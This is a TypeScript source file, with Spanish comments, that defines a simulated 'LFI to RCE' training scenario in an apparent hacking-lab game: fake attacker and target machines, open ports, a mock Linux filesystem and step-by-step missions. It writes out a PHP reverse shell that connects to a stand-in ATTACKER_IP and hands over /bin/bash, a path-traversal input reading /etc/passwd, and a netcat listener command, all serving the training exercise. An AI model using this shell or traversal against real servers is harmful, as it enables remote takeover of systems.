// ── exercises/exercise04.ts ───────────────────────────────────────
// Scenario 4 — LFI to RCE Lab
// Datos y configuración específicos para este escenario

import { assignDHCP } from '../utils/network';
import type { Machine, Scenario, MachineInfo, Port, LearningStep, Mission, FileEntry } from '../types';

// MACs únicas para máquinas atacantes (evita colisiones entre escenarios)
const ATTACKER_MACS = ['08:00:27:AA:BB:CC', '08:00:27:AA:BB:CD', '08:00:27:AA:BB:CE'];
let attackerCount = 0;

// Resetea el contador de MACs al cambiar de escenario
export function resetAttackerCounter() { attackerCount = 0; }

export function createAttackerMachine(networkRange: string, customHostname?: string): Machine {
  const mac = ATTACKER_MACS[attackerCount % ATTACKER_MACS.length];
  attackerCount++;
  return {
    id: 'attacker-01',
    machine_info: { hostname: customHostname || 'kali-attacker', ip: '', mac, os: 'Kali Linux 2023.4', status: 'up', type: 'workstation' },
    discovery_level: 4, scan_results: { ports: [] }, web_enumeration: { web_server: 'none', cms: 'none', directories: [] },
    learning_steps: [], files: [],
  };
}

interface ScenarioBuilderConfig {
  id: string; name: string; description: string;
  difficulty: 'Easy' | 'Medium' | 'Hard';
  category: 'Web' | 'Network' | 'Crypto' | 'Forensics';
  networkRange: string; attackerFiles?: FileEntry[];
  targetMachine: Omit<Machine, 'machine_info' | 'id'> & { id: string; machine_info: Omit<MachineInfo, 'ip'>; ports: Port[] };
  learningSteps: LearningStep[];
}

export function buildScenario(config: ScenarioBuilderConfig): Scenario {
  const attacker = createAttackerMachine(config.networkRange);
  if (config.attackerFiles?.length) attacker.files = config.attackerFiles;
  const target: Machine = {
    ...config.targetMachine,
    machine_info: { ...config.targetMachine.machine_info, ip: '' } as MachineInfo,
    scan_results: { ports: config.targetMachine.ports },
    web_enumeration: config.targetMachine.web_enumeration || { web_server: 'none', cms: 'none', directories: [] },
    discovery_level: 0,
    learning_steps: config.learningSteps.map((step, idx) => ({ ...step, id: idx + 1 })),
    files: config.targetMachine.files || [],
  };
  const machines = assignDHCP(config.networkRange, [attacker, target]);
  const missions: Mission[] = config.learningSteps.map((step, idx) => ({
    id: idx + 1, title: step.task, description: step.text,
    status: idx === 0 ? 'active' : 'pending', targetMachineId: config.targetMachine.id, discoveryLevel: step.discoveryLevel,
  }));
  return {
    id: config.id, name: config.name, description: config.description,
    difficulty: config.difficulty, category: config.category, network_range: config.networkRange,
    initialMachineId: 'attacker-01', machines, missions,
  };
}

export const COMMON_PORTS = {
  ssh: (version = 'OpenSSH 8.2p1 Ubuntu', creds?: { user: string; pass: string }): Port => ({ port: 22, protocol: 'tcp', state: 'open', service: 'ssh', version, credentials: creds }),
  http: (version = 'Apache httpd 2.4.41'): Port => ({ port: 80, protocol: 'tcp', state: 'open', service: 'http', version }),
  https: (version = 'nginx'): Port => ({ port: 443, protocol: 'tcp', state: 'open', service: 'https', version }),
  mysql: (state: 'open' | 'filtered' | 'closed' = 'filtered'): Port => ({ port: 3306, protocol: 'tcp', state, service: 'mysql', version: state === 'open' ? 'MySQL 5.7.38' : 'unknown' }),
  smb: (version = 'Windows 7 Professional 7601'): Port => ({ port: 445, protocol: 'tcp', state: 'open', service: 'microsoft-ds', version }),
  rdp: (): Port => ({ port: 3389, protocol: 'tcp', state: 'open', service: 'ms-wbt-server', version: 'Microsoft Terminal Services' }),
};

export function createWebDirs(paths: Array<{ path: string; status: 200 | 301 | 403 | 404; description: string }>) {
  return paths.map(p => ({ path: p.path, status: p.status, description: p.description }));
}

export function createFile(path: string, content: string, type: 'text' | 'hash' | 'binary' = 'text') {
  return { path, content, type };
}

const REVERSE_SHELL_PAYLOAD = {
  phpSimple: `<?php\n\$ip = "ATTACKER_IP"; \$port = LISTENER_PORT;\n\$sock = fsockopen(\$ip, \$port);\nif(\$sock === false) { echo "No connection"; exit(); }\n\$proc = proc_open('/bin/bash', array(0=>\$sock,1=>\$sock,2=>\$sock), \$pipes);\n?>`,
};

export interface LinuxFileSystemConfig { username?: string; password?: string; shadowPassword?: string; }

export function createLinuxFileSystem(config: LinuxFileSystemConfig = {}) {
  const u = config.username || 'www-data';
  const sp = config.shadowPassword || '$6$rounds=656000$abcdefghijklmnop$1234567890abcdefghijklmnop/1234567890123456';
  return [
    createFile('/etc/passwd', `root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nadmin:x:1000:1000:admin,,,:/home/admin:/bin/bash\n${u}:x:1001:1001:${u},,,:/home/${u}:/bin/bash`, 'text'),
    createFile('/etc/shadow', `root:${sp}:18000:0:99999:7:::\ndaemon:*:18000:0:99999:7:::\nwww-data:*:18000:0:99999:7:::`, 'text'),
    createFile('/etc/hostname', 'target-server', 'text'),
    createFile('/etc/os-release', 'NAME="Ubuntu"\nVERSION="20.04.5 LTS"\nID=ubuntu\nPRETTY_NAME="Ubuntu 20.04.5 LTS"\nVERSION_ID=20.04', 'text'),
    createFile('/var/www/html/index.html', '<!DOCTYPE html>\n<html><head><title>Web Server</title></head>\n<body><h1>Welcome to Apache2 Ubuntu Default Page</h1></body></html>', 'text'),
    createFile('/var/www/html/.htaccess', '# AuthType Basic\n# AuthName "Restricted Area"\n# AuthUserFile /var/www/html/.htpasswd', 'text'),
    createFile('/home/admin/.bashrc', 'export PATH="$HOME/bin:$PATH"\nalias ll="ls -l"\nalias la="ls -la"', 'text'),
    createFile('/home/admin/.bash_history', 'ls -la\npwd\ncat /etc/passwd\nsudo su\nwhoami', 'text'),
    createFile('/root/.bashrc', 'export PATH="/root/bin:$PATH"\nalias ll="ls -l"', 'text'),
    createFile('/var/log/auth.log', 'Mar 19 10:23:45 target-server sshd[1234]: Accepted password for admin from 192.168.1.100 port 54321 ssh2\nMar 19 10:24:12 target-server sudo: admin : TTY=pts/0 ; USER=root ; COMMAND=/bin/bash', 'text'),
    createFile('/etc/apache2/apache2.conf', '# ServerAdmin webmaster@localhost\n# DocumentRoot /var/www/html\n# <Directory /var/www/html>\n#   Options Indexes FollowSymLinks\n#   AllowOverride All\n# </Directory>', 'text'),
  ];
}

// Datos específicos para el escenario LFI to RCE
const scenario04Data = {
  id: 'scenario-04',
  name: 'LFI to RCE Lab',
  networkRange: '192.168.20.0/24',
  flags: {
    root: 'THM{LFI_REVERSE_SHELL_PWNED}',
  },
  attackerFiles: [
    { path: '/root/payload.php', content: `<?php\n\$ip = "ATTACKER_IP"; \$port = LISTENER_PORT;\n\$sock = fsockopen(\$ip, \$port);\nif(\$sock === false) { echo "No connection"; exit(); }\n\$proc = proc_open('/bin/bash', array(0=>\$sock,1=>\$sock,2=>\$sock), \$pipes);\n?>`, type: 'text' },
  ],
  targetMachine: {
    id: 'lab-scenario-04-lfi',
    hostname: 'dev-portal-backup',
    mac: '08:00:27:D6:E7:F8',
    os: 'Debian 11 (Bullseye)',
    type: 'server',
    ports: [
      { port: 80, protocol: 'tcp', state: 'open', service: 'http', version: 'Apache/2.4.52 (Debian)' },
      { port: 22, protocol: 'tcp', state: 'open', service: 'ssh', version: 'OpenSSH 8.4p1 Debian' },
    ],
    webServer: 'Apache/2.4.52',
    cms: 'Custom PHP Portal',
    directories: [
      { path: '/', status: 200, description: 'Página principal' },
      { path: '/upload.php', status: 200, description: 'Subida de archivos' },
    ],
    files: [
      { path: '/var/www/html/flag.txt', content: 'THM{LFI_REVERSE_SHELL_PWNED}', type: 'text' },
    ],
  },
  learningSteps: [
    { id: 1, task: 'Reconocimiento', text: 'Descubrir host: arp-scan <network/cidr>', discoveryLevel: 1 },
    { id: 2, task: 'Escaneo', text: 'Escanear servicios: nmap -sV <target-ip>', discoveryLevel: 2 },
    { id: 3, task: 'LFI Discovery', text: 'Prueba leer archivos: ?page=../../../../etc/passwd', discoveryLevel: 3 },
    { id: 4, task: 'Setup Listener', text: 'Prepara escucha: nc -nlvp 4444', discoveryLevel: 3 },
    { id: 5, task: 'Preparar Payload', text: 'Lee payload.php: cat /root/payload.php y sube el contenido en mantenimiento.', discoveryLevel: 3 },
    { id: 6, task: 'Remote Code Execution', text: 'Ejecuta: ?page=uploads/payload.php', discoveryLevel: 4 },
  ],
};

// Template específico para LFI to RCE
export const SCENARIO_TEMPLATES = {
  lfiRce: (): ScenarioBuilderConfig => ({
    id: scenario04Data.id,
    name: scenario04Data.name,
    description: 'Explota LFI para ejecutar una shell remota (RCE).',
    difficulty: 'Medium',
    category: 'Web',
    networkRange: scenario04Data.networkRange,
    attackerFiles: [createFile('/root/payload.php', REVERSE_SHELL_PAYLOAD.phpSimple, 'text')],
    targetMachine: {
      id: scenario04Data.targetMachine.id,
      machine_info: {
        hostname: scenario04Data.targetMachine.hostname,
        mac: scenario04Data.targetMachine.mac,
        os: scenario04Data.targetMachine.os,
        status: 'up',
        type: scenario04Data.targetMachine.type,
      },
      discovery_level: 0,
      scan_results: { ports: [] },
      learning_steps: [],
      ports: scenario04Data.targetMachine.ports,
      web_enumeration: {
        web_server: scenario04Data.targetMachine.webServer,
        cms: scenario04Data.targetMachine.cms,
        directories: scenario04Data.targetMachine.directories,
      },
      files: [
        ...createLinuxFileSystem({ username: 'www-data' }),
        createFile('/var/www/html/flag.txt', scenario04Data.flags.root),
      ],
    },
    learningSteps: scenario04Data.learningSteps.map((step, idx) => ({
      ...step,
      id: idx + 1,
      targetMachineId: scenario04Data.targetMachine.id,
    })),
  }),
};

export const scenario_04: Scenario = buildScenario(SCENARIO_TEMPLATES.lfiRce());
